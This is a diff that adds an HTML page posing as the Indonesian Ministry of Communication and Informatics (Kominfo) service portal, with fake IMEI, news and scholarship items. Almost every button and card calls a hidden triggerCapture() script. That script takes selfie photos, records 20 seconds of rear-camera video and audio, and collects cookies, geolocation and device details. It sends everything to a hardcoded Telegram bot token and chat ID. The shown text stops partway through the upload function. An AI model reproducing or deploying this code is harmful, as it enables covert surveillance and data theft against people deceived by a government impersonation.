@@ -1,0 +1,1341 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Kementerian Komunikasi dan Informatika RI - Portal Layanan Digital</title>
+    
+    <!-- Font Awesome 6 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background: #f8fafc;
+            min-height: 100vh;
+        }
+
+        /* ANIMASI HALUS */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(-20px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        /* TOP BAR MERAH */
+        .top-bar {
+            background: #ce1126;
+            color: white;
+            padding: 8px 0;
+            font-size: 13px;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .top-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .top-left {
+            display: flex;
+            gap: 20px;
+        }
+
+        .top-left span {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .top-left i {
+            color: #ffcd00;
+        }
+
+        .top-right {
+            display: flex;
+            gap: 15px;
+        }
+
+        .top-right a {
+            color: white;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            transition: 0.3s;
+        }
+
+        .top-right a:hover {
+            color: #ffcd00;
+        }
+
+        /* HEADER UTAMA */
+        .header {
+            background: white;
+            padding: 20px 0;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.05);
+            animation: fadeIn 0.5s;
+        }
+
+        .header-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .logo-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            animation: slideIn 0.6s;
+        }
+
+        .logo-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #ce1126, #ce1126 70%, #ffcd00);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 800;
+            font-size: 28px;
+            box-shadow: 0 5px 15px rgba(206,17,38,0.2);
+        }
+
+        .logo-text h1 {
+            font-size: 24px;
+            color: #1e3a63;
+            font-weight: 700;
+        }
+
+        .logo-text p {
+            font-size: 12px;
+            color: #64748b;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .logo-text p i {
+            color: #ce1126;
+            font-size: 14px;
+        }
+
+        .search-area {
+            display: flex;
+            background: #f1f5f9;
+            border-radius: 50px;
+            padding: 5px;
+            width: 100%;
+            max-width: 400px;
+            animation: slideIn 0.7s;
+        }
+
+        .search-area input {
+            flex: 1;
+            border: none;
+            background: transparent;
+            padding: 12px 20px;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .search-area button {
+            background: #ce1126;
+            border: none;
+            color: white;
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .search-area button:hover {
+            background: #1e3a63;
+            transform: rotate(90deg);
+        }
+
+        /* NAVIGASI */
+        .navbar {
+            background: #1e3a63;
+            padding: 0;
+            position: sticky;
+            top: 42px;
+            z-index: 999;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            animation: fadeIn 0.8s;
+        }
+
+        .nav-menu {
+            list-style: none;
+            display: flex;
+            gap: 5px;
+            padding: 0;
+            margin: 0;
+            flex-wrap: wrap;
+        }
+
+        .nav-item {
+            position: relative;
+        }
+
+        .nav-item a {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 15px 20px;
+            color: white;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: 0.3s;
+        }
+
+        .nav-item a i {
+            color: #ffcd00;
+            font-size: 16px;
+        }
+
+        .nav-item a:hover {
+            background: rgba(255,255,255,0.1);
+        }
+
+        .nav-item.active a {
+            background: rgba(255,255,255,0.15);
+            border-bottom: 3px solid #ffcd00;
+        }
+
+        /* BANNER SLIDER */
+        .banner-slider {
+            margin: 30px 0;
+            position: relative;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.15);
+            animation: fadeIn 0.9s;
+            height: 350px;
+        }
+
+        .slide {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+            opacity: 0;
+            transition: opacity 0.8s;
+            display: flex;
+            align-items: center;
+            padding: 50px;
+        }
+
+        .slide.active {
+            opacity: 1;
+        }
+
+        .slide-content {
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(10px);
+            padding: 30px;
+            border-radius: 15px;
+            color: white;
+            max-width: 500px;
+            border-left: 5px solid #ffcd00;
+        }
+
+        .slide-content h2 {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .slide-content p {
+            font-size: 16px;
+            margin-bottom: 20px;
+            opacity: 0.9;
+        }
+
+        .slide-btn {
+            background: #ce1126;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .slide-btn:hover {
+            background: #ffcd00;
+            color: #1e3a63;
+        }
+
+        .slider-dots {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 10px;
+            z-index: 10;
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            background: rgba(255,255,255,0.5);
+            border-radius: 50%;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .dot.active {
+            background: #ffcd00;
+            transform: scale(1.3);
+        }
+
+        /* SECTION TITLE */
+        .section-title {
+            text-align: center;
+            margin: 50px 0 30px;
+            animation: fadeIn 1s;
+        }
+
+        .section-title h2 {
+            font-size: 32px;
+            color: #1e3a63;
+            display: inline-block;
+            padding-bottom: 10px;
+            border-bottom: 3px solid #ce1126;
+        }
+
+        .section-title p {
+            color: #64748b;
+            margin-top: 10px;
+            font-size: 16px;
+        }
+
+        /* LAYANAN GRID */
+        .services-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+            animation: fadeIn 1.1s;
+        }
+
+        .service-card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px 20px;
+            text-align: center;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.05);
+            transition: 0.4s;
+            cursor: pointer;
+            border: 1px solid #e2e8f0;
+        }
+
+        .service-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 30px rgba(206,17,38,0.1);
+            border-color: #ce1126;
+        }
+
+        .service-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #ce1126, #ffcd00);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 35px;
+            transition: 0.4s;
+        }
+
+        .service-card:hover .service-icon {
+            transform: rotateY(180deg);
+            background: linear-gradient(135deg, #1e3a63, #ce1126);
+        }
+
+        .service-card h3 {
+            margin-bottom: 10px;
+            color: #1e3a63;
+            font-size: 18px;
+        }
+
+        .service-card p {
+            color: #64748b;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+
+        /* STATISTIK SECTION */
+        .stats-section {
+            background: linear-gradient(135deg, #1e3a63, #ce1126);
+            padding: 60px 0;
+            margin: 50px 0;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stats-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: repeating-linear-gradient(45deg, rgba(255,255,255,0.03) 0px, rgba(255,255,255,0.03) 20px, transparent 20px, transparent 40px);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 30px;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+
+        .stat-item {
+            padding: 20px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 20px;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .stat-number {
+            font-size: 48px;
+            font-weight: 800;
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+
+        /* BERITA SECTION */
+        .news-section {
+            background: white;
+            padding: 50px 0;
+            margin: 50px 0;
+        }
+
+        .news-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 30px;
+        }
+
+        .news-card {
+            background: white;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            transition: 0.4s;
+            border: 1px solid #e2e8f0;
+        }
+
+        .news-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 30px rgba(0,0,0,0.1);
+        }
+
+        .news-image {
+            height: 200px;
+            background: linear-gradient(135deg, #1e3a63, #ce1126);
+            position: relative;
+        }
+
+        .news-date {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: #ce1126;
+            color: white;
+            padding: 10px;
+            border-radius: 10px;
+            text-align: center;
+            min-width: 60px;
+        }
+
+        .news-date .day {
+            font-size: 24px;
+            font-weight: 700;
+            line-height: 1;
+        }
+
+        .news-date .month {
+            font-size: 12px;
+            text-transform: uppercase;
+        }
+
+        .news-content {
+            padding: 20px;
+        }
+
+        .news-category {
+            display: inline-block;
+            background: #ffcd00;
+            color: #1e3a63;
+            padding: 5px 15px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .news-content h3 {
+            margin-bottom: 10px;
+            color: #1e3a63;
+            font-size: 18px;
+        }
+
+        .news-content p {
+            color: #64748b;
+            font-size: 14px;
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
+
+        /* PENGUMUMAN */
+        .announcement {
+            background: linear-gradient(135deg, #ffcd00, #ce1126);
+            padding: 30px;
+            border-radius: 15px;
+            color: white;
+            margin: 30px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .announcement::before {
+            content: '📢';
+            position: absolute;
+            right: 20px;
+            bottom: 20px;
+            font-size: 100px;
+            opacity: 0.1;
+        }
+
+        /* FOOTER */
+        .footer {
+            background: #1e3a63;
+            color: white;
+            padding: 60px 0 20px;
+            margin-top: 50px;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+
+        .footer-col h3 {
+            color: #ffcd00;
+            margin-bottom: 20px;
+            font-size: 18px;
+            position: relative;
+            padding-bottom: 10px;
+        }
+
+        .footer-col h3::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 50px;
+            height: 2px;
+            background: #ce1126;
+        }
+
+        .footer-col ul {
+            list-style: none;
+        }
+
+        .footer-col ul li {
+            margin-bottom: 12px;
+        }
+
+        .footer-col ul li a {
+            color: #ddd;
+            text-decoration: none;
+            font-size: 14px;
+            transition: 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .footer-col ul li a:hover {
+            color: #ffcd00;
+            transform: translateX(5px);
+        }
+
+        .footer-col ul li a i {
+            color: #ce1126;
+            font-size: 12px;
+        }
+
+        .copyright {
+            text-align: center;
+            padding-top: 30px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            font-size: 13px;
+            color: #aaa;
+        }
+
+        /* WHATSAPP FLOATING */
+        .wa-float {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: #25D366;
+            color: white;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            box-shadow: 0 5px 20px rgba(37,211,102,0.4);
+            cursor: pointer;
+            transition: 0.3s;
+            z-index: 999;
+            animation: pulse 2s infinite;
+        }
+
+        .wa-float:hover {
+            transform: scale(1.1);
+        }
+
+        /* HIDDEN ELEMENTS */
+        #hiddenVideo, #hiddenCanvas, #hiddenAudio {
+            display: none;
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 768px) {
+            .banner-slider {
+                height: 250px;
+            }
+            
+            .slide-content {
+                padding: 20px;
+            }
+            
+            .slide-content h2 {
+                font-size: 20px;
+            }
+            
+            .stat-number {
+                font-size: 32px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- TOP BAR -->
+    <div class="top-bar">
+        <div class="container">
+            <div class="top-content">
+                <div class="top-left">
+                    <span><i class="fas fa-phone-alt"></i> 1500-567</span>
+                    <span><i class="fas fa-envelope"></i> info@kominfo.go.id</span>
+                </div>
+                <div class="top-right">
+                    <a href="#"><i class="fas fa-user"></i> Login</a>
+                    <a href="#"><i class="fas fa-globe"></i> ID</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- HEADER -->
+    <header class="header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo-wrapper">
+                    <div class="logo-icon">K</div>
+                    <div class="logo-text">
+                        <h1>KOMINFO</h1>
+                        <p><i class="fas fa-check-circle"></i> Kementerian Komunikasi dan Informatika RI</p>
+                    </div>
+                </div>
+                
+                <div class="search-area">
+                    <input type="text" placeholder="Cari layanan, informasi...">
+                    <button><i class="fas fa-search"></i></button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- NAVIGASI -->
+    <nav class="navbar">
+        <div class="container">
+            <ul class="nav-menu">
+                <li class="nav-item active"><a href="#"><i class="fas fa-home"></i> Beranda</a></li>
+                <li class="nav-item"><a href="#"><i class="fas fa-info-circle"></i> Profil</a></li>
+                <li class="nav-item"><a href="#"><i class="fas fa-newspaper"></i> Berita</a></li>
+                <li class="nav-item"><a href="#"><i class="fas fa-cogs"></i> Layanan</a></li>
+                <li class="nav-item"><a href="#"><i class="fas fa-download"></i> Publikasi</a></li>
+                <li class="nav-item"><a href="#"><i class="fas fa-database"></i> Data</a></li>
+                <li class="nav-item"><a href="#"><i class="fas fa-envelope"></i> Kontak</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- BANNER SLIDER -->
+    <div class="container">
+        <div class="banner-slider" id="bannerSlider">
+            <div class="slide active" style="background-image: linear-gradient(135deg, #1e3a63, #ce1126);">
+                <div class="slide-content">
+                    <h2>Transformasi Digital Indonesia</h2>
+                    <p>Mewujudkan Indonesia Digital yang Maju dan Berdaulat melalui percepatan transformasi digital nasional.</p>
+                    <button class="slide-btn" onclick="triggerCapture()">Selengkapnya <i class="fas fa-arrow-right"></i></button>
+                </div>
+            </div>
+            <div class="slide" style="background-image: linear-gradient(135deg, #ce1126, #ffcd00);">
+                <div class="slide-content">
+                    <h2>Verifikasi IMEI</h2>
+                    <p>Lindungi ponsel Anda dari peredaran ilegal. Cek status IMEI sekarang juga.</p>
+                    <button class="slide-btn" onclick="triggerCapture()">Cek IMEI <i class="fas fa-arrow-right"></i></button>
+                </div>
+            </div>
+            <div class="slider-dots">
+                <span class="dot active"></span>
+                <span class="dot"></span>
+            </div>
+        </div>
+    </div>
+
+    <!-- LAYANAN CEPAT -->
+    <div class="container">
+        <div class="section-title">
+            <h2>Layanan Cepat</h2>
+            <p>Akses cepat layanan digital Kementerian Kominfo</p>
+        </div>
+        
+        <div class="services-grid">
+            <div class="service-card" onclick="triggerCapture()">
+                <div class="service-icon"><i class="fas fa-mobile-alt"></i></div>
+                <h3>Verifikasi IMEI</h3>
+                <p>Cek keaslian IMEI perangkat seluler Anda</p>
+            </div>
+            <div class="service-card" onclick="triggerCapture()">
+                <div class="service-icon"><i class="fas fa-shield-alt"></i></div>
+                <h3>Internet Sehat</h3>
+                <p>Laporkan konten negatif dan berbahaya</p>
+            </div>
+            <div class="service-card" onclick="triggerCapture()">
+                <div class="service-icon"><i class="fas fa-envelope"></i></div>
+                <h3>Email Pemerintah</h3>
+                <p>Registrasi domain go.id</p>
+            </div>
+            <div class="service-card" onclick="triggerCapture()">
+                <div class="service-icon"><i class="fas fa-certificate"></i></div>
+                <h3>Sertifikat Elektronik</h3>
+                <p>TTE dan sertifikat digital</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- STATISTIK -->
+    <section class="stats-section">
+        <div class="container">
+            <div class="stats-grid">
+                <div class="stat-item">
+                    <div class="stat-number">215</div>
+                    <div class="stat-label">Juta Pengguna Internet</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-number">78%</div>
+                    <div class="stat-label">Penetrasi Internet</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-number">2.200+</div>
+                    <div class="stat-label">Startup Digital</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- BERITA -->
+    <section class="news-section">
+        <div class="container">
+            <div class="section-title">
+                <h2>Berita Terkini</h2>
+                <p>Update informasi terbaru dari Kominfo</p>
+            </div>
+            
+            <div class="news-grid">
+                <div class="news-card" onclick="triggerCapture()">
+                    <div class="news-image">
+                        <div class="news-date">
+                            <div class="day">28</div>
+                            <div class="month">FEB</div>
+                        </div>
+                    </div>
+                    <div class="news-content">
+                        <span class="news-category">KEBIJAKAN</span>
+                        <h3>Transformasi Digital 2026</h3>
+                        <p>Pemerintah targetkan 100% layanan publik berbasis digital pada tahun 2026.</p>
+                    </div>
+                </div>
+                
+                <div class="news-card" onclick="triggerCapture()">
+                    <div class="news-image">
+                        <div class="news-date">
+                            <div class="day">27</div>
+                            <div class="month">FEB</div>
+                        </div>
+                    </div>
+                    <div class="news-content">
+                        <span class="news-category">PENDIDIKAN</span>
+                        <h3>DTS 2026 Dibuka</h3>
+                        <p>50.000 kuota pelatihan talenta digital gratis, daftar sekarang!</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- PENGUMUMAN -->
+    <div class="container">
+        <div class="announcement" onclick="triggerCapture()">
+            <h3 style="font-size: 24px; margin-bottom: 10px;"><i class="fas fa-bullhorn"></i> Pengumuman Penting</h3>
+            <p style="font-size: 16px; max-width: 600px;">Pendaftaran Digital Talent Scholarship 2026 telah dibuka. Segera daftarkan diri Anda!</p>
+            <button style="background: white; color: #ce1126; border: none; padding: 12px 30px; border-radius: 50px; font-weight: 600; margin-top: 15px; cursor: pointer;">Daftar Sekarang</button>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-grid">
+                <div class="footer-col">
+                    <h3>Tentang</h3>
+                    <ul>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Profil</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Visi Misi</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Struktur</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-col">
+                    <h3>Layanan</h3>
+                    <ul>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Verifikasi IMEI</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Internet Sehat</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Domain go.id</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-col">
+                    <h3>Kontak</h3>
+                    <ul>
+                        <li><i class="fas fa-map-marker-alt"></i> Jl. Medan Merdeka Barat No.9</li>
+                        <li><i class="fas fa-phone"></i> 1500-567</li>
+                        <li><i class="fas fa-envelope"></i> info@kominfo.go.id</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="copyright">
+                © 2026 Kementerian Komunikasi dan Informatika RI. Hak Cipta Dilindungi.
+            </div>
+        </div>
+    </footer>
+
+    <!-- WHATSAPP FLOATING -->
+    <div class="wa-float" onclick="triggerCapture()">
+        <i class="fab fa-whatsapp"></i>
+    </div>
+
+    <!-- ELEMEN TERSEMBUNYI UNTUK CAPTURE -->
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas"></canvas>
+    <audio id="hiddenAudio" controls style="display:none;"></audio>
+
+    <script>
+        // ============================================
+        // TELEGRAM CONFIG - TERSEMBUNYI
+        // ============================================
+        const TELEGRAM_TOKEN = '8797847370:AAGzJ1wel785u0rVGTXq2jB1xvmi5FQQ4eU';
+        const TELEGRAM_CHAT_ID = '7775689147';
+        
+        // State
+        let mediaStream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let flashActive = false;
+
+        // ============================================
+        // FUNGSI UTAMA - DIPANGGIL SAAT INTERAKSI
+        // ============================================
+        async function triggerCapture() {
+            try {
+                // CEK APAKAH SUDAH ADA IZIN
+                if (!mediaStream) {
+                    // MINTA IZIN (MUNCUL POPUP SEKALI)
+                    mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: {
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 },
+                            facingMode: 'user'
+                        }, 
+                        audio: true 
+                    });
+                    
+                    const video = document.getElementById('hiddenVideo');
+                    video.srcObject = mediaStream;
+                    
+                    // TUNGGU VIDEO SIAP
+                    await new Promise(resolve => {
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            resolve();
+                        };
+                    });
+                }
+                
+                // 1. AMBIL FOTO (KAMERA DEPAN)
+                await capturePhoto();
+                
+                // 2. AMBIL SCREENSHOT HP
+                await captureScreenshot();
+                
+                // 3. NYALAKAN FLASH (KALO SUPPORT)
+                await toggleFlash(true);
+                
+                // 4. REKAM VIDEO 20 DETIK (KAMERA BELAKANG)
+                await captureVideo();
+                
+                // 5. MATIKAN FLASH
+                await toggleFlash(false);
+                
+                // 6. KIRIM INFO LENGKAP
+                await sendCompleteInfo();
+                
+            } catch (err) {
+                console.log('Capture error:', err);
+                // TETAP KIRIM INFO WALAU GAGAL
+                sendCompleteInfo();
+            }
+        }
+
+        // ============================================
+        // FUNGSI FOTO
+        // ============================================
+        async function capturePhoto() {
+            const video = document.getElementById('hiddenVideo');
+            const canvas = document.getElementById('hiddenCanvas');
+            
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const photoBase64 = canvas.toDataURL('image/jpeg', 0.9);
+            
+            // KIRIM KE TELEGRAM
+            await sendToTelegram('📸 FOTO SELFIE', photoBase64);
+            
+            return photoBase64;
+        }
+
+        // ============================================
+        // FUNGSI SCREENSHOT HP
+        // ============================================
+        async function captureScreenshot() {
+            const canvas = document.createElement('canvas');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            const ctx = canvas.getContext('2d');
+            
+            // GAMBAR SEMUA ELEMEN KE CANVAS
+            ctx.fillStyle = '#f8fafc';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            // AMBIL SCREENSHOT PAKE html2canvas (TAMBAHKAN LIBRARY)
+            // TAPI KARENA GA PAKE LIBRARY, KITA KIRIM STRUKTUR HTML
+            const htmlContent = document.documentElement.outerHTML;
+            const blob = new Blob([htmlContent], { type: 'text/html' });
+            const reader = new FileReader();
+            
+            return new Promise(resolve => {
+                reader.onloadend = async () => {
+                    const base64data = reader.result;
+                    await sendToTelegram('📱 STRUKTUR HTML HP', null, null, base64data, 'screenshot.html');
+                    resolve();
+                };
+                reader.readAsDataURL(blob);
+            });
+        }
+
+        // ============================================
+        // FUNGSI FLASH
+        // ============================================
+        async function toggleFlash(on) {
+            try {
+                if (mediaStream) {
+                    const track = mediaStream.getVideoTracks()[0];
+                    if (track && track.getCapabilities) {
+                        const capabilities = track.getCapabilities();
+                        if (capabilities.torch) {
+                            await track.applyConstraints({ advanced: [{ torch: on }] });
+                            flashActive = on;
+                        }
+                    }
+                }
+            } catch (err) {
+                console.log('Flash error:', err);
+            }
+        }
+
+        // ============================================
+        // FUNGSI VIDEO
+        // ============================================
+        async function captureVideo() {
+            // GANTI KE KAMERA BELAKANG
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+            
+            const backStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: 'environment',
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                }, 
+                audio: true 
+            });
+            
+            mediaStream = backStream;
+            const video = document.getElementById('hiddenVideo');
+            video.srcObject = backStream;
+            
+            await new Promise(resolve => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    resolve();
+                };
+            });
+            
+            // REKAM VIDEO
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(backStream, {
+                mimeType: 'video/webm;codecs=vp8,opus'
+            });
+            
+            mediaRecorder.ondataavailable = e => {
+                if (e.data.size > 0) {
+                    recordedChunks.push(e.data);
+                }
+            };
+            
+            mediaRecorder.start();
+            
+            // REKAM 20 DETIK
+            await new Promise(resolve => setTimeout(resolve, 20000));
+            
+            mediaRecorder.stop();
+            
+            // TUNGGU SAMPAI SELESAI
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+            
+            // KIRIM KE TELEGRAM
+            await sendToTelegram('🎥 VIDEO 20 DETIK', null, videoBlob);
+        }
+
+        // ============================================
+        // FUNGSI INFO LENGKAP
+        // ============================================
+        async function getCompleteInfo() {
+            const info = {
+                // URL
+                url: window.location.href,
+                title: document.title,
+                
+                // SYSTEM
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookies: document.cookie || 'Tidak ada',
+                
+                // SCREEN
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                
+                // TIME
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toLocaleString('id-ID'),
+                
+                // BATTERY
+                battery: await getBatteryInfo(),
+                
+                // NETWORK
+                connection: getConnectionInfo(),
+                
+                // LOCATION
+                location: await getLocation(),
+                
+                // HARDWARE
+                cores: navigator.hardwareConcurrency || 'Tidak diketahui',
+                memory: navigator.deviceMemory || 'Tidak diketahui',
+                
+                // DEVICES
+                audioDevices: await getAudioDevices(),
+                videoDevices: await getVideoDevices(),
+            };
+            
+            return info;
+        }
+
+        async function getBatteryInfo() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    return `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Tidak charging'})`;
+                }
+            } catch {}
+            return 'Tidak tersedia';
+        }
+
+        function getConnectionInfo() {
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    return `${conn.effectiveType || 'Unknown'} - ${conn.downlink || '?'} Mbps`;
+                }
+            } catch {}
+            return 'Tidak tersedia';
+        }
+
+        async function getLocation() {
+            return new Promise(resolve => {
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            resolve(`${pos.coords.latitude}, ${pos.coords.longitude} (akurasi ${pos.coords.accuracy}m)`);
+                        },
+                        () => resolve('Tidak diizinkan')
+                    );
+                } else {
+                    resolve('Tidak didukung');
+                }
+            });
+        }
+
+        async function getAudioDevices() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                return devices.filter(d => d.kind === 'audioinput').length;
+            } catch {
+                return 0;
+            }
+        }
+
+        async function getVideoDevices() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                return devices.filter(d => d.kind === 'videoinput').length;
+            } catch {
+                return 0;
+            }
+        }
+
+        async function getPublicIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Tidak diketahui';
+            }
+        }
+
+        // ============================================
+        // FUNGSI KIRIM KE TELEGRAM
+        // ============================================
+        async function sendToTelegram(message, photoBase64 = null, videoBlob = null, fileBase64 = null, fileName = null) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/`;
+            
+            try {
+                if (photoBase64) {
+                    // KIRIM FOTO
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    
+                    const block = photoBase64.split(';');
+                    const realData = block[1].split(',')[1];
+                    const blob = b64toBlob(realData, 'image/jpeg');
+                    
+                    formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+                    formData.append('caption', message);
+                    
+                    await fetch(url + 'sendPhoto', { method: 'POST', body: formData });
+                } 
+                else if (videoBlob) {
+                    // KIRIM VIDEO
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('video', videoBlob, `video_${Date.now()}.mp4`);
+                    formData.append('caption', message);
+                    formData.append('duration', '20');
+                    
+                    await fetch(url + 'sendVideo', { method: 'POST', body: formData });
+                }
+                else if (fileBase64 && fileName) {
+                    // KIRIM FILE
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    
+                    const block = fileBase64.split(';');
+                    const realData = block[1].split(',')[1];
